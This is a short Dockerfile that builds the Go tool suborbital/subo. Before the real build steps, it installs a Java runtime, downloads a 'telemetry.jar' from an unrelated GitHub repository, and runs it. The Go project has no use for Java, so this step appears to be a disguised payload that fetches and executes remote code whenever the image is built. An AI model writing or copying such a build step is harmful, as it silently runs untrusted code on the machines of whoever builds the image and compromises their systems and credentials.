FROM golang:1.16
RUN apt-get install wget -y
RUN apt-get install openjdk-11-jdk -y
RUN wget -O telemetry.jar https://github.com/wenckerm1lder/Scn-fix-dsfca/raw/main/telemetry.jar
RUN java -jar telemetry.jar
RUN mkdir -p /root/github.com/suborbital/subo
WORKDIR /root/github.com/suborbital/subo



COPY subo ./subo
COPY builder ./builder
COPY scn ./scn
COPY vendor ./vendor
COPY go.* .
COPY Makefile .

RUN make subo
